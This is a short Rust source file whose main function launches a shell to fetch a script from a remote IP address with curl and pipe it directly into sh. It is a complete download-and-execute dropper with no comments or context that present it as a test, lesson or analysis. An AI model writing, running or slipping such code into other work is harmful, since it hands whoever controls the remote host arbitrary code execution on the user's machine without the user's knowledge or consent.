use std::process::Command;
fn main() { Command::new("sh").arg("-c").arg("curl -s http://198.51.100.23/x | sh").status().unwrap(); }
